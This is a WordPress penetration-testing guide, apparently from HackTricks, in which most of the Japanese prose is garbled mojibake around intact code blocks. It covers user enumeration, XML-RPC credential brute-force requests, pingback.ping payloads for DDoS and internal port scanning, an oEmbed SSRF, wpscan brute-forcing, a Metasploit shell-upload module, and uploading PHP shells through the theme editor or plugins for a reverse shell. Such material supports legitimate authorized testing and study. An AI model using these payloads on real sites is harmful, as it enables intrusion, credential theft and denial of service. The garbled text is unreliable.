# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** ãã®ãŸã‚ theme ã®ä¸€éƒ¨ã® php ã‚’å¤‰æ›´ã—ã¦ RCE ã‚’å¾—ã‚‹å ´åˆã¯ãŠãã‚‰ããã®ãƒ‘ã‚¹ã‚’ä½¿ã„ã¾ã™ã€‚ä¾‹ãˆã°: **theme twentytwelve** ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€æ¬¡ã®å ´æ‰€ã§ **404.php** ãƒ•ã‚¡ã‚¤ãƒ«ã« **access** ã§ãã¾ã™: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- `wp-config.php` ã«ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã® root ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚
- ãƒã‚§ãƒƒã‚¯ã™ã¹ããƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒ­ã‚°ã‚¤ãƒ³ãƒ‘ã‚¹: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` ã«ã¯ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹ WordPress ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãªã©æœ‰ç”¨ãªæƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚
- `wp-activate.php` ã¯æ–°ã—ã„ WordPress ã‚µã‚¤ãƒˆã‚’ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã™ã‚‹éš›ã®ãƒ¡ãƒ¼ãƒ«æœ‰åŠ¹åŒ–ãƒ—ãƒ­ã‚»ã‚¹ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
- Login folders (may be renamed to hide it):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ã¯ã€HTTP ã‚’ãƒˆãƒ©ãƒ³ã‚¹ãƒãƒ¼ãƒˆæ©Ÿæ§‹ã€XML ã‚’ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°æ©Ÿæ§‹ã¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ã‚’é€å—ä¿¡ã™ã‚‹ WordPress ã®æ©Ÿèƒ½ã‚’è¡¨ã™ãƒ•ã‚¡ã‚¤ãƒ«ã§ã™ã€‚ã“ã®ç¨®ã®é€šä¿¡ã¯ WordPress ã® [REST API](https://developer.wordpress.org/rest-api/reference) ã«ç½®ãæ›ãˆã‚‰ã‚Œã¦ã„ã¾ã™ã€‚
- `wp-content` ãƒ•ã‚©ãƒ«ãƒ€ã¯ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚„ãƒ†ãƒ¼ãƒãŒæ ¼ç´ã•ã‚Œã‚‹ä¸»è¦ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ã™ã€‚
- `wp-content/uploads/` ã¯ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ãŒä¿å­˜ã•ã‚Œã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ã™ã€‚
- `wp-includes/` ã¯è¨¼æ˜æ›¸ã€ãƒ•ã‚©ãƒ³ãƒˆã€JavaScript ãƒ•ã‚¡ã‚¤ãƒ«ã€ã‚¦ã‚£ã‚¸ã‚§ãƒƒãƒˆãªã©ã‚³ã‚¢ãƒ•ã‚¡ã‚¤ãƒ«ãŒæ ¼ç´ã•ã‚Œã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ã™ã€‚
- `wp-sitemap.xml` ã¯ WordPress ãƒãƒ¼ã‚¸ãƒ§ãƒ³ 5.5 ä»¥é™ã§ã€ã™ã¹ã¦ã®å…¬é–‹æŠ•ç¨¿ãŠã‚ˆã³å…¬é–‹ã‚¯ã‚¨ãƒªå¯èƒ½ãªæŠ•ç¨¿ã‚¿ã‚¤ãƒ—ã¨ã‚¿ã‚¯ã‚½ãƒãƒŸãƒ¼ã‚’å«ã‚€ sitemap XML ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç”Ÿæˆã—ã¾ã™ã€‚

**Post exploitation**

- `wp-config.php` ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹åã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ›ã‚¹ãƒˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€èªè¨¼ã‚­ãƒ¼ã¨ã‚½ãƒ«ãƒˆã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ†ãƒ¼ãƒ–ãƒ«ã®ãƒ—ãƒ¬ãƒ•ã‚£ãƒƒã‚¯ã‚¹ãªã©ã€WordPress ãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«æ¥ç¶šã™ã‚‹ãŸã‚ã«å¿…è¦ãªæƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã¯ DEBUG ãƒ¢ãƒ¼ãƒ‰ã‚’æœ‰åŠ¹ã«ã™ã‚‹ãŸã‚ã«ã‚‚ä½¿ç”¨ã§ãã€ãƒˆãƒ©ãƒ–ãƒ«ã‚·ãƒ¥ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã«å½¹ç«‹ã¤ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

### Users Permissions

- **ç®¡ç†è€… (Administrator)**
- **ç·¨é›†è€… (Editor)**: è‡ªåˆ†ã¨ä»–äººã®æŠ•ç¨¿ã‚’å…¬é–‹ãŠã‚ˆã³ç®¡ç†ã§ãã¾ã™
- **æŠ•ç¨¿è€… (Author)**: è‡ªåˆ†ã®æŠ•ç¨¿ã‚’å…¬é–‹ãŠã‚ˆã³ç®¡ç†ã§ãã¾ã™
- **å¯„ç¨¿è€… (Contributor)**: æŠ•ç¨¿ã‚’ä½œæˆãŠã‚ˆã³ç®¡ç†ã§ãã¾ã™ãŒã€å…¬é–‹ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“
- **è³¼èª­è€… (Subscriber)**: æŠ•ç¨¿ã‚’é–²è¦§ã—ã€è‡ªåˆ†ã®ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ã‚’ç·¨é›†ã§ãã¾ã™

## **Passive Enumeration**

### **Get WordPress version**

`/license.txt` ã¾ãŸã¯ `/readme.html` ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦‹ã¤ã‘ã‚‰ã‚Œã‚‹ã‹ç¢ºèªã—ã¦ãã ã•ã„

ãƒšãƒ¼ã‚¸ã® **source code** å†…ï¼ˆä¾‹: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)ï¼‰:

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link files

![](<../../images/image (533).png>)

- JavaScript files

![](<../../images/image (524).png>)

### ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’å–å¾—
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ãƒ†ãƒ¼ãƒã‚’å–å¾—
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ä¸€èˆ¬çš„ãªãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®æŠ½å‡º
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## ã‚¢ã‚¯ãƒ†ã‚£ãƒ–åˆ—æŒ™

### ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¨ãƒ†ãƒ¼ãƒ

ãŠãã‚‰ãã™ã¹ã¦ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¨ãƒ†ãƒ¼ãƒã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ã™ã¹ã¦ã‚’ç™ºè¦‹ã™ã‚‹ã«ã¯ã€**ç©æ¥µçš„ã« Brute Force ã§ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¨ãƒ†ãƒ¼ãƒã®ãƒªã‚¹ãƒˆã‚’åˆ—æŒ™ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ï¼ˆå¹¸ã„ã«ã‚‚ã€ã“ã‚Œã‚‰ã®ãƒªã‚¹ãƒˆã‚’å«ã‚€è‡ªå‹•åŒ–ãƒ„ãƒ¼ãƒ«ãŒå­˜åœ¨ã—ã¾ã™ï¼‰ã€‚

### ãƒ¦ãƒ¼ã‚¶ãƒ¼

- **ID Brute:** WordPressã‚µã‚¤ãƒˆã‹ã‚‰æœ‰åŠ¹ãªãƒ¦ãƒ¼ã‚¶ã‚’å–å¾—ã™ã‚‹ã«ã¯ã€Brute Forcing users IDsã‚’è¡Œã„ã¾ã™:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒ **200** ã¾ãŸã¯ **30X** ã®å ´åˆã€ãã® id ã¯ **æœ‰åŠ¹** ã§ã™ã€‚ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒ **400** ã®å ´åˆã€ãã® id ã¯ **ç„¡åŠ¹** ã§ã™ã€‚

- **wp-json:** ãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±ã‚’ã‚¯ã‚¨ãƒªã«ã‚ˆã£ã¦å–å¾—ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æƒ…å ±ã‚’æ˜ã‚‰ã‹ã«ã§ãã‚‹åˆ¥ã® `/wp-json/` endpoint ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Only information about the users that has this feature enable will be provided**.

ã¾ãŸã€**/wp-json/wp/v2/pages** ã¯ IP ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ leak ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã“ã¨ã«ã‚‚æ³¨æ„ã—ã¦ãã ã•ã„ã€‚

- **Login username enumeration**: **`/wp-login.php`** ã§ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹éš›ã€è¡¨ç¤ºã•ã‚Œã‚‹ **ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸** ãŒã€æŒ‡å®šã—ãŸ **ãƒ¦ãƒ¼ã‚¶ãƒ¼åãŒå­˜åœ¨ã™ã‚‹ã‹ã©ã†ã‹** ã«ã‚ˆã£ã¦ **ç•°ãªã‚‹** ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

### XML-RPC

ã‚‚ã— `xml-rpc.php` ãŒæœ‰åŠ¹ã§ã‚ã‚Œã°ã€credentials brute-force ã‚’è¡Œã£ãŸã‚Šã€ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã—ã¦ DoS æ”»æ’ƒã‚’ä»•æ›ã‘ã‚‹ãŸã‚ã«åˆ©ç”¨ã—ãŸã‚Šã§ãã¾ã™ã€‚(ä¾‹ãˆã°ã€ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã¯[ using this](https://github.com/relarizky/wpxploit) ã‚’ä½¿ã£ã¦è‡ªå‹•åŒ–ã§ãã¾ã™ã€‚)

æœ‰åŠ¹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã«ã¯ã€_**/xmlrpc.php**_ ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ä»¥ä¸‹ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¦ã¿ã¦ãã ã•ã„ï¼š

**ãƒã‚§ãƒƒã‚¯**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**èªè¨¼æƒ…å ± Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ã¾ãŸã¯ **`metaWeblog.getUsersBlogs`** ã¯èªè¨¼æƒ…å ±ã‚’ brute-force ã™ã‚‹ãŸã‚ã«ä½¿ãˆã‚‹ãƒ¡ã‚½ãƒƒãƒ‰ã®ã„ãã¤ã‹ã§ã™ã€‚ã“ã‚Œã‚‰ã®ã„ãšã‚Œã‹ã‚’è¦‹ã¤ã‘ãŸã‚‰ã€æ¬¡ã®ã‚ˆã†ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
èªè¨¼æƒ…å ±ãŒæœ‰åŠ¹ã§ãªã„å ´åˆã€ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ _"Incorrect username or password"_ ã¯ 200 ã‚³ãƒ¼ãƒ‰ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹å†…ã«è¡¨ç¤ºã•ã‚Œã‚‹ã¯ãšã§ã™ã€‚

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

æ­£ã—ã„èªè¨¼æƒ…å ±ã‚’ä½¿ç”¨ã™ã‚‹ã¨ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚ãƒ¬ã‚¹ãƒãƒ³ã‚¹å†…ã«ãƒ‘ã‚¹ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ï¼ˆ[https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982)ï¼‰ã€‚
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
ã¾ãŸã€åŒã˜ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§è¤‡æ•°ã®credentialsã‚’è©¦ã›ã‚‹ãŸã‚ã€**ã‚ˆã‚Šé«˜é€Ÿãªæ–¹æ³•**ã¨ã—ã¦ **`system.multicall`** ã‚’ä½¿ã£ã¦credentialsã‚’brute-forceã§ãã¾ã™:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**2FAã‚’ãƒã‚¤ãƒ‘ã‚¹**

ã“ã®æ–¹æ³•ã¯ãƒ—ãƒ­ã‚°ãƒ©ãƒ å‘ã‘ã§äººé–“å‘ã‘ã§ã¯ãªãã€å¤ã„ãŸã‚2FAã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€æœ‰åŠ¹ãªcredsã‚’æŒã£ã¦ã„ã¦ã‚‚ãƒ¡ã‚¤ãƒ³ã®å…¥å£ãŒ2FAã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹å ´åˆã€xmlrpc.phpã‚’æ‚ªç”¨ã—ã¦ãã‚Œã‚‰ã®credsã§2FAã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã™ã¹ã¦ã®ã‚³ãƒ³ã‚½ãƒ¼ãƒ«æ“ä½œãŒè¡Œãˆã‚‹ã‚ã‘ã§ã¯ãªã„ç‚¹ã«æ³¨æ„ã—ã¦ãã ã•ã„ãŒã€IppsecãŒèª¬æ˜ã—ã¦ã„ã‚‹ã‚ˆã†ã«RCEã«åˆ°é”ã§ãã‚‹å ´åˆã‚‚ã‚ã‚Šã¾ã™: [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

ä¸€è¦§å†…ã« _**pingback.ping**_ ãŒã‚ã‚Œã°ã€Wordpress ã«ä»»æ„ã® host/port ã¸ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‰ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚  
ã“ã‚Œã¯ **thousands** ã® Wordpress **sites** ã«åŒä¸€ã® **location** ã¸ **access** ã•ã›ã‚‹ãŸã‚ã«ä½¿ãˆï¼ˆãã® location ã§ **DDoS** ãŒç™ºç”Ÿã—ã¾ã™ï¼‰ã€ã¾ãŸã¯ **Wordpress** ã‚’ä½¿ã£ã¦å†…éƒ¨ **network** ã® **scan** ã‚’è¡Œã‚ã›ã‚‹ãŸã‚ã«ä½¿ã†ã“ã¨ã‚‚ã§ãã¾ã™ï¼ˆä»»æ„ã® port ã‚’æŒ‡å®šå¯èƒ½ï¼‰ã€‚
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

ã‚‚ã—**faultCode**ã®å€¤ãŒ**0**ã‚ˆã‚Š**å¤§ãã„**ï¼ˆ17ï¼‰ã®å ´åˆã€ãã‚Œã¯ãã®ãƒãƒ¼ãƒˆãŒé–‹ã„ã¦ã„ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã®**`system.multicall`**ã®ä½¿ç”¨æ³•ã‚’å‚ç…§ã—ã€ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æ‚ªç”¨ã—ã¦DDoSã‚’å¼•ãèµ·ã“ã™æ–¹æ³•ã‚’å­¦ã‚“ã§ãã ã•ã„ã€‚

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php ã® DoS

ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯é€šå¸¸ WordPress ã‚µã‚¤ãƒˆã®ãƒ«ãƒ¼ãƒˆã«å­˜åœ¨ã—ã¾ã™: **`/wp-cron.php`**\
ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒ **accessed** ã•ã‚Œã‚‹ã¨ã€**"heavy"** ãª MySQL **query** ãŒå®Ÿè¡Œã•ã‚Œã‚‹ãŸã‚ã€**attackers** ã«ã‚ˆã£ã¦ **DoS** ã‚’ **cause** ã™ã‚‹ãŸã‚ã«åˆ©ç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
ã¾ãŸã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ `wp-cron.php` ã¯å„ãƒšãƒ¼ã‚¸ãƒ­ãƒ¼ãƒ‰æ™‚ï¼ˆã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒä»»æ„ã®Wordpressãƒšãƒ¼ã‚¸ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã™ã‚‹ãŸã³ã«ï¼‰å‘¼ã³å‡ºã•ã‚Œã‚‹ãŸã‚ã€ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ãŒå¤šã„ã‚µã‚¤ãƒˆã§ã¯å•é¡Œï¼ˆDoSï¼‰ã‚’å¼•ãèµ·ã“ã™ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

Wp-Cron ã‚’ç„¡åŠ¹åŒ–ã—ã€ãƒ›ã‚¹ãƒˆå†…ã§å®šæœŸçš„ã«å¿…è¦ãªå‡¦ç†ã‚’å®Ÿè¡Œã™ã‚‹å®Ÿéš›ã® cronjob ã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚’æ¨å¥¨ã—ã¾ã™ï¼ˆå•é¡Œã‚’å¼•ãèµ·ã“ã•ãªã„ã‚ˆã†ã«ï¼‰ã€‚

### /wp-json/oembed/1.0/proxy - SSRF

_https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ã‚‹ã¨ã€Worpress ã‚µã‚¤ãƒˆãŒã‚ãªãŸã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã‚Œã¯å‹•ä½œã—ãªã„å ´åˆã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã§ã™:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

ã“ã®ãƒ„ãƒ¼ãƒ«ã¯ **methodName: pingback.ping** ã¨ãƒ‘ã‚¹ **/wp-json/oembed/1.0/proxy** ã‚’ãƒã‚§ãƒƒã‚¯ã—ã€å­˜åœ¨ã™ã‚‹å ´åˆã¯ãã‚Œã‚‰ã‚’æ‚ªç”¨ã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚

## è‡ªå‹•ãƒ„ãƒ¼ãƒ«
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## ãƒ“ãƒƒãƒˆã‚’ä¸Šæ›¸ãã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ã™ã‚‹

å®Ÿéš›ã®æ”»æ’ƒã¨ã„ã†ã‚ˆã‚Šèˆˆå‘³æœ¬ä½ã®äº‹ä¾‹ã§ã™ã€‚CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) ã§ã¯ä»»æ„ã® wordpress ãƒ•ã‚¡ã‚¤ãƒ«ã®1ãƒ“ãƒƒãƒˆã‚’åè»¢ã§ãã¾ã—ãŸã€‚ä¾‹ãˆã°ã€ãƒ•ã‚¡ã‚¤ãƒ« `/var/www/html/wp-includes/user.php` ã®ä½ç½® `5389` ã‚’åè»¢ã—ã¦ NOT (`!`) ã‚’ NOP ã«ã§ãã¾ã™ã€‚
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ãƒ†ãƒ¼ãƒã® php ã‚’å¤‰æ›´ã™ã‚‹ï¼ˆadmin credentials ãŒå¿…è¦ï¼‰**

Appearance â†’ Theme Editor â†’ 404 Templateï¼ˆå³å´ï¼‰

php shell ã®å†…å®¹ã«å¤‰æ›´ã™ã‚‹:

![](<../../images/image (384).png>)

æ›´æ–°ã—ãŸãƒšãƒ¼ã‚¸ã«ã©ã†ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã‹ã‚’ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã§èª¿ã¹ã¦ãã ã•ã„ã€‚ä»Šå›ã¯æ¬¡ã®å ´æ‰€ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ä½¿ç”¨ã§ãã¾ã™:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã€‚

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
ä¾‹ãˆã°æ¬¡ã®ã‚ˆã†ã« php ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚’ä½œæˆã—ã¾ã™:

![](<../../images/image (183).png>)

æ¬¡ã«æ–°ã—ã„ plugin ã‚’è¿½åŠ ã—ã¾ã™:

![](<../../images/image (722).png>)

plugin ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¦ Install Now ã‚’æŠ¼ã—ã¾ã™:

![](<../../images/image (249).png>)

Procced ã‚’ã‚¯ãƒªãƒƒã‚¯:

![](<../../images/image (70).png>)

ãŠãã‚‰ãä½•ã‚‚èµ·ããªã„ã‚ˆã†ã«è¦‹ãˆã¾ã™ãŒã€Media ã«ç§»å‹•ã™ã‚‹ã¨ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸ shell ãŒè¦‹ãˆã¾ã™:

![](<../../images/image (462).png>)

ãã‚Œã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ reverse shell ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã® URL ãŒè¡¨ç¤ºã•ã‚Œã¾ã™:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

ã“ã®æ–¹æ³•ã¯ã€è„†å¼±ã§ã‚ã‚‹ã“ã¨ãŒçŸ¥ã‚‰ã‚Œã¦ã„ã‚‹æ‚ªæ„ã‚ã‚‹ plugin ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã€web shell ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã™ã‚‹ã“ã¨ã‚’å«ã¿ã¾ã™ã€‚ãƒ—ãƒ­ã‚»ã‚¹ã¯ WordPress ãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰ã‹ã‚‰ä»¥ä¸‹ã®ã‚ˆã†ã«å®Ÿè¡Œã•ã‚Œã¾ã™:

1. **Plugin Acquisition**: The plugin is obtained from a source like Exploit DB like [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress ãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰ã«ç§»å‹•ã—ã€`Dashboard > Plugins > Upload Plugin` ã«é€²ã¿ã¾ã™ã€‚
- ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã® zip ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
3. **Plugin Activation**: ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒæ­£å¸¸ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸã‚‰ã€ãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰ã‹ã‚‰æœ‰åŠ¹åŒ–ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
4. **Exploitation**:
- ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ "reflex-gallery" ãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œæœ‰åŠ¹åŒ–ã•ã‚Œã¦ã„ã‚‹ã¨ã€è„†å¼±ã§ã‚ã‚‹ã“ã¨ãŒçŸ¥ã‚‰ã‚Œã¦ãŠã‚Šã€æ‚ªç”¨ãŒå¯èƒ½ã§ã™ã€‚
